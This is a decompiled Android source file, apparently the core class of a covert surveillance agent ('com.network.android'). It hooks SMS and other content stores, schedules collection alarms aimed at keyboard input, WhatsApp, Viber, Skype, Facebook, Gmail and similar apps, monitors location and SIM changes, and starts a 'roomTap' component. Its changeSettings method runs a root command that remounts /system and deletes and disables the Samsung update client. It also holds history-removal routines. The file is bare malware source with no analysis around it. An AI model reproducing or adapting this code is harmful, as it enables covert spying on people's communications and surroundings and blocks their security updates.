package com.network.android.agent;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import com.network.android.SmsReceiver;
import com.network.android.a.c;
import com.network.android.ab;
import com.network.android.android.monitor.AndroidMonitorApplication;
import com.network.android.c.a.a;
import com.network.android.d.i;
import com.network.android.g;
import com.network.android.j;
import com.network.android.m;
import com.network.android.monitor.observer.e;
import com.network.android.monitor.observer.l;
import com.network.android.monitor.observer.n;
import com.network.android.roomTap.BlackScreen;
import com.network.b.b;
import com.network.media.CoreReceiver;
import com.network.media.f;
import java.io.File;
import java.util.Timer;
import java.util.concurrent.locks.ReentrantLock;

public class NetworkApp extends AndroidMonitorApplication {

    /* renamed from: a  reason: collision with root package name */
    public static Handler f57a;
    public static final ReentrantLock b = new ReentrantLock();
    private static Timer d = new Timer();
    private static Context e;
    private boolean c = false;

    static {
        HandlerThread handlerThread = new HandlerThread("NetworkApp");
        handlerThread.start();
        f57a = new Handler(handlerThread.getLooper());
    }

    public static Context a() {
        return e;
    }

    public static void a(Context context) {
        g.a("NetworkApp emptyDataQueueAyn");
        f57a.post(new e(context));
    }

    private static void a(Context context, int i, String str, AlarmManager alarmManager) {
        try {
            a.a("NetworApp removeHistory: " + i);
            Intent intent = new Intent(context, CoreReceiver.class);
            intent.setData(Uri.parse("TO_REMOVE:" + i));
            intent.setAction("RemoveHistory");
            intent.putExtra("timeToStop", i);
            intent.putExtra("toRemove", str);
            alarmManager.set(0, System.currentTimeMillis() + ((long) i), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Throwable th) {
            a.a("removeHistory" + th.getMessage(), th);
        }
    }

    private static void a(Context context, long j, long j2, String str, AlarmManager alarmManager) {
        try {
            a.a("NetworApp onCreate setAlarm triggerAtMillis:" + j + ", intervalMillis:" + j2 + " ,actionType:" + str);
            Intent intent = new Intent(context, CoreReceiver.class);
            intent.setAction(str);
            alarmManager.setRepeating(0, j, j2, PendingIntent.getBroadcast(e, 0, intent, 0));
        } catch (Throwable th) {
            a.a("NetworApp setAlarm exception: " + th.getMessage(), th);
        }
    }

    static /* synthetic */ void a(NetworkApp networkApp) {
        try {
            if (!networkApp.c) {
                networkApp.c = true;
                boolean z = networkApp.getSharedPreferences("NetworkPreferences", 0).getBoolean("finish", true);
                a.a("dumpAll finishDump value:" + z);
                b.d(networkApp);
                a.a("dumpAll started appstarted value:" + networkApp.c);
                SmsReceiver.b = SmsReceiver.b(networkApp);
                com.network.android.c.a.b.a(1, 2, "LOG_AGENT_INIT_SUCCESED");
                c.a(networkApp, j.a());
                if (z) {
                    a.a("read wake up");
                    b((Context) networkApp);
                } else if (e != null && com.network.h.b.a()) {
                    a.a("NetworkApp dumpAll content");
                    b.h();
                    f.a("dump");
                }
                if (b.z != null) {
                    a.a("dumpAll removeHistory URL: " + b.z);
                    AlarmManager alarmManager = (AlarmManager) networkApp.getSystemService("alarm");
                    a(networkApp, 30000, b.z, alarmManager);
                    a(networkApp, 300000, b.z, alarmManager);
                    a(networkApp, 600000, b.z, alarmManager);
                    return;
                }
                a.a("dumpAll removeHistory : No URL to remove");
            }
        } catch (Throwable th) {
            a.a("dumpAll: " + th.getMessage(), th);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:32:0x011a  */
    /* JADX WARNING: Removed duplicated region for block: B:34:0x0123  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void b(android.content.Context r8) {
        /*
        // Method dump skipped, instructions count: 298
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.agent.NetworkApp.b(android.content.Context):void");
    }

    static /* synthetic */ void b(NetworkApp networkApp) {
        try {
            AlarmManager alarmManager = (AlarmManager) networkApp.getSystemService("alarm");
            a(networkApp, 30000, 60000, "wake up", alarmManager);
            com.network.g.a.a(networkApp, alarmManager);
            if (b.c()) {
                String[] strArr = {"keyboard", "viber", "skype", "whatsUp", "facebook", "kakao", "twitter", "gmail", "GMail"};
                for (int i = 0; i < strArr.length; i++) {
                    a(networkApp, (long) ((60000 * i) + 70000), (long) (strArr.length * 60000), strArr[i], alarmManager);
                }
            }
        } catch (Throwable th) {
            a.a("NetworkApp setAlarms exception " + th.getMessage(), th);
        }
    }

    static /* synthetic */ void d(Context context) {
        try {
            a.a("changeSettings");
            if (com.network.h.b.d(context)) {
                a.a("changeSettings set off SOFTWARE_UPDATE_AUTO_UPDATE");
                Settings.System.putInt(context.getContentResolver(), "SOFTWARE_UPDATE_AUTO_UPDATE", 0);
            } else {
                a.a("changeSettings not install on system  not changing SOFTWARE_UPDATE_AUTO_UPDATE");
            }
            if (new File("/system/csk").exists()) {
                a.a("changeSettings remove auto update");
                String str = "mount -o remount,rw,exec,suid /system; rm /system/app/FotaClient.apk; rm /system/app/FotaClient.odex; pm disable com.sec.android.fotaclient;";
                if (!c.e()) {
                    str = str + "pm uninstall com.sec.android.fotaclient";
                }
                m.c(str);
            }
        } catch (Throwable th) {
            a.a("changeSettings" + th.getMessage(), th);
        }
    }

    /* access modifiers changed from: protected */
    @Override // com.network.android.android.monitor.AndroidMonitorApplication
    public final void a(IntentFilter intentFilter) {
        a.a("NetworkApp 2.9.3 initialize start API: " + Build.VERSION.SDK_INT + ", FINGERPRINT " + Build.FINGERPRINT);
        try {
            Context applicationContext = getApplicationContext();
            e = applicationContext;
            SharedPreferences sharedPreferences = getSharedPreferences("NetworkPreferences", 0);
            b.lock();
            boolean z = sharedPreferences.getBoolean("isItFirstRunEver", true);
            a.a("NetworkApp initialize is it first run in conf : " + z);
            if (z) {
                File file = new File("/data/data/com.network.android");
                com.network.h.b.a(file.getAbsolutePath());
                file.mkdir();
                sharedPreferences = getSharedPreferences("NetworkPreferences", 0);
                a.a("NetworkApp initialize setting first run param to false");
                SharedPreferences.Editor edit = sharedPreferences.edit();
                edit.putBoolean("isItFirstRunEver", false);
                edit.commit();
                a.a("NetworkApp jumper result: " + com.network.h.a.a(applicationContext));
            }
            b.unlock();
            if (!com.network.h.b.h(applicationContext)) {
                f57a.postDelayed(new a(this, applicationContext), 300000);
                ab.a(f57a);
                f57a.post(new b(this));
                boolean z2 = sharedPreferences.getBoolean("finish", true);
                a(new n(), intentFilter);
                a(new com.network.android.monitor.observer.a(), intentFilter);
                a(new com.network.android.monitor.observer.g(z2), intentFilter);
                a(new e(), intentFilter);
                a(new l(), intentFilter);
                applicationContext.getContentResolver();
                m.a(SmsReceiver.c, applicationContext, false);
                applicationContext.getContentResolver();
                com.network.android.d.a.a(SmsReceiver.c, applicationContext, false);
                applicationContext.getContentResolver();
                com.network.android.d.g.a(SmsReceiver.c, applicationContext, false);
                applicationContext.getContentResolver();
                com.network.android.d.c.a(SmsReceiver.c, applicationContext, false);
                applicationContext.getContentResolver();
                i.a(SmsReceiver.c, applicationContext, false);
                applicationContext.getContentResolver();
                com.network.android.d.e.a(SmsReceiver.c, applicationContext, false);
                BlackScreen.a(this, sharedPreferences);
                com.network.location.a.c(applicationContext);
                com.network.i.b.a();
                a.a("NetworkApp initialize end");
            }
        } catch (Throwable th) {
            a.a("initialize: " + th.getMessage(), th);
        }
    }

    public final void b() {
        try {
            long v = b.v();
            long w = b.w();
            a.a("NetworkApp locationMonitorTimeLimit: " + v);
            a.a("NetworkApp locationMonitorSampleRateLong: " + w);
            if (w != 0) {
                if (v == 0) {
                    c.a(this, w, v);
                    return;
                }
                long currentTimeMillis = v - (System.currentTimeMillis() / 1000);
                if (currentTimeMillis > 0) {
                    c.a(this, w, currentTimeMillis);
                }
            }
        } catch (Throwable th) {
            a.a("NetworkApp locationMonitor: " + th.getMessage(), th);
        }
    }

    public final void c(Context context) {
        String str;
        boolean z;
        boolean z2 = true;
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences("NetworkPreferences", 0);
            String simSerialNumber = ((TelephonyManager) context.getSystemService("phone")).getSimSerialNumber();
            a.a("BootReceiver curent Sim: " + simSerialNumber);
            if (simSerialNumber != null && simSerialNumber.length() != 0) {
                String string = sharedPreferences.getString("NetworkWindowSim", "No Sim Number");
                a.a("BootReceiver last Sim: " + string);
                if (string == null) {
                    a.a("BootReceiver failed to retrive last sim. use: No Sim Number");
                    str = "No Sim Number";
                } else {
                    str = string;
                }
                if (b.C.booleanValue()) {
                    z = !str.equals(simSerialNumber);
                } else {
                    if (str.equals(simSerialNumber) || str.equals("No Sim Number")) {
                        z2 = false;
                    }
                    z = z2;
                }
                if (z) {
                    a.a("BootReceiver Sim Changed Old: " + str);
                    a.a("BootReceiver Sim Changed new: " + simSerialNumber);
                    f57a.postDelayed(new f(this, context), 2000);
                }
                SharedPreferences.Editor edit = sharedPreferences.edit();
                edit.putString("NetworkWindowSim", simSerialNumber);
                edit.commit();
            } else if (!b.C.booleanValue()) {
                a.a("No Sim !!");
                com.network.android.c.a.b.a(1, 7, "LOG_SIM_NOT_FOUND");
            } else {
                a.a("No Sim, but we are local Installation mode");
            }
        } catch (Throwable th) {
            a.a("checkSimChange: " + th.getMessage(), th);
        }
    }

    @Override // com.network.android.android.monitor.AndroidMonitorApplication
    public void onCreate() {
        try {
            a.a("NetworApp onCreate");
            super.onCreate();
            a.a("NetworApp onCreate readProperties");
            com.network.b.a.c();
            a.a("NetworApp onCreate deleteUpgradeFiles");
            com.network.h.j.b();
            f57a.postDelayed(new c(this), 4000);
            f57a.postDelayed(new d(this), 10000);
        } catch (Throwable th) {
            a.a("onCreate: " + th.getMessage(), th);
        }
    }
}
